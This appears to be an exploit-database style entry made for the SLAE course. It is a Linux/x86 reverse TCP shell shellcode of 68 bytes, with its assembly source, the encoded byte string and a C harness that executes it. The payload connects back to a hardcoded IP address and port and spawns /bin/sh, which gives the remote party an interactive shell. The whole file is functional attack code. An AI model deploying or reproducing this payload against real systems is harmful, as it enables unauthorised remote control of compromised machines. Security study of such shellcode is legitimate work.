/*
; Title     : Linux/x86 - Reverse TCP Shell Shellcode (68 bytes)
; Date      : May, 2018
; Author    : Nuno Freitas
; Blog Post : https://bufferoverflowed.wordpress.com
; Twitter   : @nunof11
; SLAE ID   : SLAE-1112
; Size      : 68 bytes
; Tested on : i686 GNU/Linux

section .text

global _start

_start:
	xor ecx, ecx
	mul ecx

	mov al, 0x66
	push ebx
	inc ebx
	push ebx
	push 0x2
	mov ecx, esp
	int 0x80

	pop ecx
        xchg eax, ebx
loop:
	mov al, 0x3f
        int 0x80
        dec ecx
        jns loop

	mov al, 0x66
	dec ebx
	push 0x04020a0a	 ; IP
	push word 0x5c11 ; Port
	push bx
	mov ecx,esp
	push 0x10
	push ecx
	inc ebx
	push ebx
	mov ecx,esp
	int 0x80

	mov al, 0x0b
	xor ecx, ecx
	push ecx
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov ebx, esp
	int 0x80

*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x31\xc9\xf7\xe1\xb0\x66\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x4b\x68\x0a\x0a\x02\x04\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x43\x53\x89\xe1\xcd\x80\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

void main()
{
	printf("Shellcode Length:  %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;
	ret();
}